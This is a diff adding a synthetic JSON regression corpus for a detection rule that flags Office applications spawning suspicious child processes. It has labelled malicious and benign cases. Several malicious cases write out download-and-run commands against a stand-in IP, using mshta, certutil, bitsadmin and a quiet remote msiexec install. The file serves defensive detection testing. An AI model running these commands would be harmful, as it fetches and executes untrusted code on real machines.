@@ -1,0 +1,307 @@
+{
+ "rule": "SX-007",
+ "description": "Synthetic labeled cases. A regression corpus, not a real-world evaluation.",
+ "cases": [
+  {
+   "id": "SX-007-m01",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Word spawns cmd",
+   "events": [
+    {
+     "k": "p",
+     "img": "cmd.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "cmd": "cmd.exe /c whoami"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m02",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Excel spawns PowerShell",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+     "cmd": "powershell.exe -nop"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m03",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "PowerPoint spawns wscript",
+   "events": [
+    {
+     "k": "p",
+     "img": "wscript.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
+     "cmd": "wscript.exe a.vbs"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m04",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Outlook spawns mshta",
+   "events": [
+    {
+     "k": "p",
+     "img": "mshta.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+     "cmd": "mshta.exe http://203.0.113.9/a.hta"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m05",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Access spawns rundll32",
+   "events": [
+    {
+     "k": "p",
+     "img": "rundll32.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSACCESS.EXE",
+     "cmd": "rundll32.exe x.dll,Run"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m06",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Publisher spawns regsvr32",
+   "events": [
+    {
+     "k": "p",
+     "img": "regsvr32.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSPUB.EXE",
+     "cmd": "regsvr32 /s x.dll"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m07",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "OneNote spawns certutil",
+   "events": [
+    {
+     "k": "p",
+     "img": "certutil.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE",
+     "cmd": "certutil -urlcache -f http://203.0.113.9/a a"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m08",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Word spawns pwsh",
+   "events": [
+    {
+     "k": "p",
+     "img": "pwsh.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "cmd": "pwsh.exe -c 1"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m09",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Excel spawns bitsadmin",
+   "events": [
+    {
+     "k": "p",
+     "img": "bitsadmin.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+     "cmd": "bitsadmin /transfer j http://203.0.113.9/a a"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m10",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "note": "Excel spawns cscript",
+   "events": [
+    {
+     "k": "p",
+     "img": "cscript.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+     "cmd": "cscript a.js"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-m11",
+   "rule": "SX-007",
+   "label": "malicious",
+   "synthetic": true,
+   "known_gap": true,
+   "note": "Word spawns msiexec",
+   "events": [
+    {
+     "k": "p",
+     "img": "msiexec.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "cmd": "msiexec /i http://203.0.113.9/a.msi /q"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b01",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "Word spawns the print helper",
+   "events": [
+    {
+     "k": "p",
+     "img": "splwow64.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "cmd": "splwow64.exe 12288"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b02",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "Outlook opens a browser",
+   "events": [
+    {
+     "k": "p",
+     "img": "chrome.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+     "cmd": "chrome.exe https://example.test"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b03",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "Excel spawns error reporting",
+   "events": [
+    {
+     "k": "p",
+     "img": "werfault.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+     "cmd": "werfault.exe -u"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b04",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "cmd spawns PowerShell",
+   "events": [
+    {
+     "k": "p",
+     "img": "powershell.exe",
+     "par": "C:\\Windows\\System32\\cmd.exe",
+     "cmd": "powershell.exe Get-Date"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b05",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "explorer starts Word (Office is the child)",
+   "events": [
+    {
+     "k": "p",
+     "img": "WINWORD.EXE",
+     "par": "explorer.exe",
+     "cmd": "winword.exe doc.docx"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b06",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "explorer starts cmd",
+   "events": [
+    {
+     "k": "p",
+     "img": "cmd.exe",
+     "par": "explorer.exe",
+     "cmd": "cmd.exe"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b07",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "Word restarts itself",
+   "events": [
+    {
+     "k": "p",
+     "img": "WINWORD.EXE",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "cmd": "winword.exe /safe"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b08",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "Outlook opens Edge",
+   "events": [
+    {
+     "k": "p",
+     "img": "msedge.exe",
+     "par": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+     "cmd": "msedge.exe https://example.test"
+    }
+   ]
+  },
+  {
+   "id": "SX-007-b09",
+   "rule": "SX-007",
+   "label": "benign",
+   "synthetic": true,
+   "note": "services spawns cmd",
+   "events": [
+    {
+     "k": "p",
+     "img": "cmd.exe",
+     "par": "services.exe",
+     "cmd": "cmd.exe /c backup.bat"
+    }
+   ]
+  }
+ ]
+}
